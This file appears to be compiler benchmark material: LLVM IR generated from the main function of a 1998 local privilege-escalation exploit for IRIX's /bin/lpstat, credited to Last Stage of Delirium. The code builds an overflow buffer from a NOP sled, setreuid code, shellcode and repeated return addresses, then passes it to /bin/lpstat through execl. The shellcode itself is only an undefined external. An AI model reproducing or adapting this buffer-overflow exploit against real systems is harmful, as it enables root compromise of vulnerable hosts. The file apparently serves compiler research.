; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20129.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20129.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM nov 1998 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c"/bin/lpstat for irix 6.2 6.3 IP:17,19,20,21,22,32\0A\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@setreuidcode = common dso_local global i8** null, align 8
@shellcode = common dso_local global i8** null, align 8
@ADRNUM = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"/bin/lpstat\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i64, i64* @jump, align 8
  %14 = inttoptr i64 %13 to i64 (...)*
  %15 = call i64 (...) %14()
  %16 = add i64 %15, 8888
  %17 = add i64 %16, 1364
  %18 = add i64 %17, 140
  %19 = sub i64 %18, 15012
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %21 = bitcast i8* %20 to i64*
  store i64 %19, i64* %21, align 1
  %22 = load i64, i64* @jump, align 8
  %23 = inttoptr i64 %22 to i64 (...)*
  %24 = call i64 (...) %23()
  %25 = add i64 %24, 8888
  %26 = add i64 %25, 140
  %27 = add i64 %26, 544
  %28 = add i64 %27, 32748
  %29 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %30 = bitcast i8* %29 to i64*
  store i64 %28, i64* %30, align 1
  %31 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %31, i8** %9, align 8
  %32 = load i8*, i8** %9, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %9, align 8
  store i8 -1, i8* %32, align 1
  store i32 0, i32* %10, align 4
  br label %34

34:                                               ; preds = %48, %2
  %35 = load i32, i32* %10, align 4
  %36 = load i32, i32* @NOPNUM, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %51

38:                                               ; preds = %34
  %39 = load i32*, i32** @nop, align 8
  %40 = load i32, i32* %10, align 4
  %41 = srem i32 %40, 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %39, i64 %42
  %44 = load i32, i32* %43, align 4
  %45 = trunc i32 %44 to i8
  %46 = load i8*, i8** %9, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %9, align 8
  store i8 %45, i8* %46, align 1
  br label %48

48:                                               ; preds = %38
  %49 = load i32, i32* %10, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %10, align 4
  br label %34

51:                                               ; preds = %34
  store i32 0, i32* %10, align 4
  br label %52

52:                                               ; preds = %66, %51
  %53 = load i32, i32* %10, align 4
  %54 = load i8**, i8*** @setreuidcode, align 8
  %55 = call i32 @strlen(i8** %54)
  %56 = icmp slt i32 %53, %55
  br i1 %56, label %57, label %69

57:                                               ; preds = %52
  %58 = load i8**, i8*** @setreuidcode, align 8
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8*, i8** %58, i64 %60
  %62 = load i8*, i8** %61, align 8
  %63 = ptrtoint i8* %62 to i8
  %64 = load i8*, i8** %9, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %9, align 8
  store i8 %63, i8* %64, align 1
  br label %66

66:                                               ; preds = %57
  %67 = load i32, i32* %10, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %10, align 4
  br label %52

69:                                               ; preds = %52
  store i32 0, i32* %10, align 4
  br label %70

70:                                               ; preds = %84, %69
  %71 = load i32, i32* %10, align 4
  %72 = load i8**, i8*** @shellcode, align 8
  %73 = call i32 @strlen(i8** %72)
  %74 = icmp slt i32 %71, %73
  br i1 %74, label %75, label %87

75:                                               ; preds = %70
  %76 = load i8**, i8*** @shellcode, align 8
  %77 = load i32, i32* %10, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  %80 = load i8*, i8** %79, align 8
  %81 = ptrtoint i8* %80 to i8
  %82 = load i8*, i8** %9, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %9, align 8
  store i8 %81, i8* %82, align 1
  br label %84

84:                                               ; preds = %75
  %85 = load i32, i32* %10, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %10, align 4
  br label %70

87:                                               ; preds = %70
  store i32 0, i32* %10, align 4
  br label %88

88:                                               ; preds = %100, %87
  %89 = load i32, i32* %10, align 4
  %90 = load i32, i32* @ADRNUM, align 4
  %91 = icmp slt i32 %89, %90
  br i1 %91, label %92, label %103

92:                                               ; preds = %88
  %93 = load i32, i32* %10, align 4
  %94 = srem i32 %93, 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = load i8*, i8** %9, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %9, align 8
  store i8 %97, i8* %98, align 1
  br label %100

100:                                              ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %10, align 4
  br label %88

103:                                              ; preds = %88
  store i32 0, i32* %10, align 4
  br label %104

104:                                              ; preds = %116, %103
  %105 = load i32, i32* %10, align 4
  %106 = load i32, i32* @PCHNUM, align 4
  %107 = icmp slt i32 %105, %106
  br i1 %107, label %108, label %119

108:                                              ; preds = %104
  %109 = load i32, i32* %10, align 4
  %110 = srem i32 %109, 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %111
  %113 = load i8, i8* %112, align 1
  %114 = load i8*, i8** %9, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %9, align 8
  store i8 %113, i8* %114, align 1
  br label %116

116:                                              ; preds = %108
  %117 = load i32, i32* %10, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %10, align 4
  br label %104

119:                                              ; preds = %104
  %120 = load i8*, i8** %9, align 8
  store i8 0, i8* %120, align 1
  %121 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %122 = call i32 @execl(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %121, i32 0)
  %123 = load i32, i32* %3, align 4
  ret i32 %123
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
